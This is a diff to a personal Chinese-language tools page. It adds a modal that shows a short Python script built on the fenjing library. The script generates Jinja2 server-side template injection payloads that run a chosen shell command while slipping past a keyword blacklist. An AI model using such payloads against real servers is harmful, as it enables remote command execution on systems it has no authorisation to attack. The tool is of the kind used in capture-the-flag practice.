@@ -55,6 +55,32 @@
     <div class="box"></div>
     <p style="margin-top: 20px;">这个页面存在的意义是？我也不知道呢，或许有的时候，存在即合理。</p></br>
     <p>或许也是为了自己方便罢了，如果你碰巧发现了这里，也希望可以方便到你啦。</p>
+    <div class="tool" onclick="openModal()"><h2>Jinjia_ssti</h2></div>
+    <div id="modal-overlay" class="overlay">
+      <div class="modal">
+        <span class="close-btn" onclick="closeModal()">&times;</span>
+        <h2>SSTI</h2>
+        <p>如你所见，jinjia_ssti工具，用于生成payload</p>
+        <div class="code_block">
+          from fenjing import exec_cmd_payload, config_payload</br>
+          import logging</br>
+          import sys</br>
+          
+          logging.basicConfig(level=logging.INFO)</br>
+          
+          def waf(s: str, blacklist: list[str]):</br>
+              return all(word not in s for word in blacklist)</br>
+          
+          if __name__ == "__main__":</br>
+              blacklist_input = input("Enter the values for blacklist (separated by spaces): ")</br>
+              blacklist = blacklist_input.split()</br>
+              shell = input("Enter the value for shell: ")</br>
+              shell_payload, _ = exec_cmd_payload(lambda s: waf(s, blacklist), shell)</br>
+              print(f"{shell_payload=}")</br></br>
+        </div>
+        <p>使用方法：python环境下直接使用，记得导入依赖库</p>
+      </div>
+    </div>
   </div>
   </body>
 </html>
